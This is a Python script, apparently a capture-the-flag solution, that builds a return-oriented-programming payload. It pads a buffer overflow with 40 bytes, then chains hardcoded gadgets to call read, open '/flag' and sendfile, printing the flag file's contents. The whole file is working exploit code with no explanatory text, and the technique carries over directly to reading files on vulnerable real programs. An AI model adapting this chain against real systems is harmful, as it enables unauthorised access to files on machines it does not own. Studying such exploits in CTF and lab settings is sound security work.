#!/usr/bin/env python3

from struct import pack

payload = b'a' * 40

# 0x405080 is the address of a global variable.
# read(0, 0x405080, 5);
payload += pack("<Q", 0x402476) # pop rax ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x40249e) # pop rdi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x40248e) # pop rsi ; ret
payload += pack("<Q", 0x405080) # data
payload += pack("<Q", 0x402496) # pop rdx ; ret
payload += pack("<Q", 5)        # data
payload += pack("<Q", 0x402486) # syscall ; ret

# open("/flag", 0);  // 0 is O_RDONLY.
payload += pack("<Q", 0x402476) # pop rax ; ret
payload += pack("<Q", 0x40101a) # ret
payload += pack("<Q", 0x4011e7) # mov edi, 0x405080 ; jmp rax
payload += pack("<Q", 0x40248e) # pop rsi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x402476) # pop rax ; ret
payload += pack("<Q", 2)        # data
payload += pack("<Q", 0x402486) # syscall ; ret

# sendfile(1, 3, 0, 400);
payload += pack("<Q", 0x402476) # pop rax ; ret
payload += pack("<Q", 40)       # data
payload += pack("<Q", 0x40249e) # pop rdi ; ret
payload += pack("<Q", 1)        # data
payload += pack("<Q", 0x40248e) # pop rsi ; ret
payload += pack("<Q", 3)        # data
payload += pack("<Q", 0x402496) # pop rdx ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x4024ae) # pop r10 ; ret
payload += pack("<Q", 400)      # data
payload += pack("<Q", 0x402486) # syscall ; ret

with open("payload", "wb") as f:
    f.write(payload)
